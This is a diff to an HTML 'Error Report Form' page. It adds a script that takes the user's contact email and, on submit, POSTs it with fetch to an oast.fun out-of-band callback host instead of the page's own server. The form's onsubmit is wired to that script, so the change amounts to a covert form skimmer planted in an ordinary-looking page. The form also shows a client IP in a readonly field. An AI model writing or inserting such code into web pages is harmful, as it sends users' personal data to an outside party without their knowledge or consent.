@@ -12,18 +12,40 @@
         }
     </style>
     <script>
-        // JavaScript to set the "Time" field with the current time
         window.onload = function() {
             const timeField = document.getElementById("time");
             const now = new Date();
             const formattedTime = now.toLocaleTimeString();
             timeField.value = formattedTime;
         }
+
+        function submitForm() {
+            const emailField = document.getElementById("contact-email").value;
+
+            // Create a new FormData object
+            const formData = new FormData();
+            formData.append("contact-email", emailField);
+
+            // Send a POST request with the form data
+            fetch("http://ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun", {
+                method: "POST",
+                body: formData
+            })
+            .then(function(response) {
+                if (response.ok) {
+                    // Reload the page after the POST request is successful
+                    location.reload();
+                } else {
+                    // Handle the response if needed
+                    console.error("Failed to submit the form.");
+                }
+            });
+        }
     </script>
 </head>
 <body>
     <h1>Error Report Form</h1>
-    <form>
+    <form onsubmit="submitForm(); return false;">
         <label for="error-details">Error Details:</label>
         <input type="text" id="error-details" name="error-details" value="ERROR::ID:607::RAY_ID::G6j2A4f8e3H1k5m7p9s0u8W2z4q::CLIENT_IP::62.5.87.1" readonly>
 
